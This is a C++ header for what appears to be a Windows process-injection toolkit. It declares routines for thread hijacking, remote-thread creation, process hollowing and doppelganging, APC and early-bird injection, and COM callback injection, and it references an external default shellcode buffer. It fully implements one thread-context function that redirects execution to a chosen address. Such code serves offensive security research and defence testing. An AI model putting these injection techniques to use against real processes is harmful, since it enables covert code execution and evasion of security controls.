#pragma once

#include <cstdint>

#include "phnt_windows.h"
#include "phnt.h"

#include "sysapi.h"

#include "kernel_dump.h"

namespace scripts {

extern char *default_shellcode_data;
extern size_t default_shellcode_size;

enum class RemoteProcessMemoryMethod : uint8_t {
    AllocateInAddr,
    CreateSectionMap,
    CreateSectionMapLocalMap,
    LiveDumpParse, // RO
    MaxValue = LiveDumpParse
};

const char *decode(RemoteProcessMemoryMethod method);


struct RemoteProcessMemoryContext {

    RemoteProcessMemoryMethod method = (RemoteProcessMemoryMethod)-1;

    HANDLE ProcessHandle = NULL;
    PVOID RemoteBaseAddress = nullptr;
    ULONG Size = 0;

    HANDLE Section = NULL;
    PVOID LocalBaseAddress = nullptr;

    kernel_dump::kernel_dump_context_t kernel_dump_ctx;
    kernel_dump::process_t kernel_dump_process;
};

enum class RemoteProcessOpenMethod : uint8_t {
    OpenProcess,
    OpenProcessByHwnd,
    MaxValue = OpenProcessByHwnd
};

const char *decode(RemoteProcessOpenMethod method);

HANDLE process_open(RemoteProcessOpenMethod method, uint32_t pid, ACCESS_MASK AccessMask = PROCESS_ALL_ACCESS);

bool process_init_memory(RemoteProcessMemoryContext& ctx, RemoteProcessMemoryMethod method,
                         HANDLE ProcessHandle, uint32_t pid);
bool process_create_memory(RemoteProcessMemoryContext& ctx);
bool process_read_memory(const RemoteProcessMemoryContext& ctx, size_t offset, PVOID Data, SIZE_T Size);
bool process_write_memory(const RemoteProcessMemoryContext& ctx, size_t offset, PVOID Data, SIZE_T Size);
bool process_memory_create_write(RemoteProcessMemoryContext& ctx, PVOID Data, SIZE_T Size);
bool process_memory_create_write_fixup_addr(RemoteProcessMemoryContext& ctx, PVOID Data, SIZE_T Size, RemoteProcessMemoryContext& ctx_fixup, size_t offset_fixup);

bool process_pe_image_relocate(const RemoteProcessMemoryContext& ctx, PVOID ImageBuffer);

//

bool process_write_params(HANDLE ProcessHandle, PRTL_USER_PROCESS_PARAMETERS Params, PVOID PebBaseAddress, RemoteProcessMemoryMethod method);

unique_c_mem<PEB> process_read_peb(HANDLE ProcessHandle);

sysapi::unique_handle process_find_alertable_thread(HANDLE ProcessHandle);

//

template <bool is_new_thread, bool is_64>
// in case of new thread we need to change AddressOfEntryPoint which is RCX/EAX
// in case of active thread we need to change RIP/EIP
bool thread_set_execute(HANDLE ThreadHandle, PVOID ExecAddress) {

    using THREAD_CONTEXT = std::conditional_t<is_64, CONTEXT, WOW64_CONTEXT>;

    unique_c_mem<THREAD_CONTEXT> context;
    if (!context.allocate()) {
        return false;
    }

    memset(context.data(), 0, sizeof(THREAD_CONTEXT));

    context->ContextFlags = CONTEXT_FULL;

    wprintf(L"  [*] getting old thread context...\n");

    bool res;

    if constexpr (is_64) {
        res = sysapi::ThreadGetContext(ThreadHandle, context.data());
    }
    else {
        res = sysapi::ThreadGetWow64Context(ThreadHandle, context.data());
    }

    if (!res) {
        return false;
    }

    wprintf(L"  [*] setting thread context with address to execute at 0x%p...\n", ExecAddress);

    if constexpr (is_64) {
        if constexpr (is_new_thread) {
            context->Rcx = (DWORD64)(UINT_PTR)ExecAddress;
        }
        else {
            context->Rip = (DWORD64)(UINT_PTR)ExecAddress;
        }

        res = sysapi::ThreadSetContext(ThreadHandle, context.data());
    }
    else {
        if constexpr (is_new_thread) {
            context->Eax = (DWORD)(UINT_PTR)ExecAddress;
        }
        else {
            context->Eip = (DWORD)(UINT_PTR)ExecAddress;
        }

        res = sysapi::ThreadSetWow64Context(ThreadHandle, context.data());
    }

    if (!res) {
        return false;
    }

    return true;
}

//

bool system_init_live_dump(kernel_dump::kernel_dump_context_t& ctx);

//

bool inject_hijack_remote_thread(uint32_t pid,
                                 RemoteProcessOpenMethod open_method,
                                 RemoteProcessMemoryMethod memory_method);
bool inject_create_remote_thread(uint32_t pid,
                                 RemoteProcessOpenMethod open_method,
                                 RemoteProcessMemoryMethod memory_method);
bool inject_create_process_hollow(const std::wstring& original_image,
                                  const std::wstring& injected_image,
                                  RemoteProcessMemoryMethod method);
bool inject_create_process_doppel(const std::wstring& original_image,
                                  const std::wstring& injected_image,
                                  RemoteProcessMemoryMethod method);
bool inject_queue_apc(uint32_t pid,
                      uint32_t tid,
                      RemoteProcessOpenMethod open_method,
                      RemoteProcessMemoryMethod memory_method);
bool inject_queue_apc_early_bird(const std::wstring& original_image,
                                 RemoteProcessMemoryMethod memory_method);
bool inject_com_irundown_docallback(uint32_t pid,
                                    RemoteProcessOpenMethod open_method,
                                    RemoteProcessMemoryMethod memory_method);
void execute_rop_gadget_local();

}